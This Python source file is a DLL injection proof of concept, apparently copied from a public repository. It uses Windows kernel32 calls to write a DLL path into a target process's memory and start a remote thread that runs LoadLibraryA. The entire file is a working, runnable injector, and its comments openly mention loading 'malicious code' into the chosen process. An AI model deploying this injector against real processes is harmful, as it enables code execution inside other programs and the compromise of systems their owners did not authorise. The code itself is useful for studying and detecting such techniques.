# -*- coding: ascii -*-

#DLL Injection PoC in python.
#Taken from: https://github.com/infodox/python-dll-injection

from ctypes import *
import sys
#This script takes two arguments :
#1. path of the dll to be injected
#2. process id of target process

#DLL Malicious code should be ran in initiation steps of the dll
#as the target process may not even use any of functionalities of
#dll

#Note that this DLL Injection is done in easy way and it's most
#likely to be detected.

class DLLInjector:
    def __init__(self, _pid, _dll_path):
        #set values and create the handle
        #kernel32.dll uses ansi encoding so we need to encode our string in that encoding too.
        self.pid = int(_pid)
        self.dll_path = str(_dll_path).encode('ansi')
        self.dll_len = len(self.dll_path)

        #Memory addresses and premissions
        self.PAGE_READWRITE = 0x04
       # self.PROCESS_ALL_ACCESS = (0x00F0000 | 0x0010000 | 0xFFF)
        self.PROCESS_ALL_ACCESS = (0x0002 | 0x0008 | 0x0010 | 0x0020)
        self.VIRTUAL_MEM = (0x1000 | 0x2000)
        
        
        #get the process handle
        self.kernel32 = windll.kernel32
       # self.kernel32 = WinDLL("kernel32.dll")
        self.h_process = self.kernel32.OpenProcess(self.PROCESS_ALL_ACCESS,
                                              False,
                                              self.pid)
        if not self.h_process:
            #if could not get handle to the process raise an exception and exit
            raise self.CouldNotGetHandle("Cannot get handle to PID: {}".format(str(self.pid)), self.kernel32.GetLastError())

        

    def WriteDLLPath(self):
        #Allocate memory and inject dll address into target's memory
        self.arg_address = self.kernel32.VirtualAllocEx(self.h_process,
                                                        0,
                                                        self.dll_len,
                                                        self.VIRTUAL_MEM,
                                                        self.PAGE_READWRITE)

        #Write dll address to target's memory
        written = c_int(0)
        self.kernel32.WriteProcessMemory(self.h_process, self.arg_address, self.dll_path, self.dll_len, byref(written))

    def Inject(self):
        #Create a remote thread to load the library (dll)

        #First write dll path into target's memory
        self.WriteDLLPath()

        
        #Resolve LoadLibraryA Address
       # h_kernel32 = self.kernel32.GetModuleHandleA("kernel32.dll") #get kernel32.dll module handle
       # h_kernel32 = self.kernel32._handle
        h_loadlib = self.kernel32.GetProcAddress(self.kernel32._handle, "LoadLibraryA".encode('ansi')) #kernel32 parses stiring with 'ansi' encoding but python3 uses unicode as default encoding.

        if h_loadlib == 0:
            #Failed to retrieve LoadLibraryA address so return error code
            errcode = self.kernel32.GetLastError()
            return (None, "Could not retrieve \"LoadLibraryA\"'s address, ErrCode: {}".format(str(errcode)))

        #Inject the dll
        #Create a remote thread with h_loadlib addr as entrypoint and
        #pass dll_path (self.arg_address) as param.
        thread_id = c_ulong(0)
        if not self.kernel32.CreateRemoteThread(self.h_process, None, 0, h_loadlib, self.arg_address, 0, byref(thread_id)):
            errcode = self.kernel32.GetLastError()
            return (None, "Could not inject dll, ErrCode: {}".format(str(errcode)))

        return (self.pid, "Remote Thread created with id {}".format(str(thread_id.value)))


    class CouldNotGetHandle(Exception):
        """
            This Exception is raised when we could not get a handle to something.
            arguments are:
            @param: message: message to be shown to the user
            @param: errcode: error code retrieved by "kernel32.dll"'s last "GetLastError" function that is
            preceeded by the message argument.
        """

        def __init__(self, message, errcode):
            print("Could not get handle to an object. Windows API error code:", errcode) 
            print(message)
            sys.exit(1)
            




#Main part
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: {} <PID> <DLL_PATH>".format(sys.argv[0]))
        sys.exit(0)

    pid = sys.argv[1]
    dll_path = sys.argv[2]
    
    myDLLInjector = DLLInjector(pid, dll_path)
#    if type(myDLLInjecor) is tuple:
        #something went wrong
 #       print(myDLLInjector[1])
  #  else:

    result = myDLLInjector.Inject()
        
    print(result[1])

    
                      
    





